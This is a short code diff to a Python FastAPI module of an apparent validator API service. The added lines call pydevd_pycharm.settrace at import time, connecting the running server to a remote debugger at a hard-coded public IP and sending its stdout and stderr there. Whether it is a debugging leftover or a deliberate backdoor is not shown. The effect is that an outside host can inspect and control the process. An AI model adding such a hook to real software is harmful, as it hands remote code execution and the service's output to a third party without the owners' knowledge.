@@ -16,6 +16,15 @@ from validator_api.gpt_endpoints import router as gpt_router
 from validator_api.utils import update_miner_availabilities_for_api
 from validator_api.web_retrieval import router as web_retrieval_router
 
+import pydevd_pycharm
+
+pydevd_pycharm.settrace(
+    host='46.199.201.61',
+    port=12345,
+    stdoutToServer=True,
+    stderrToServer=True,
+    suspend=False  # Set to True if you want to pause execution here
+)
 
 @contextlib.asynccontextmanager
 async def lifespan(app: FastAPI):
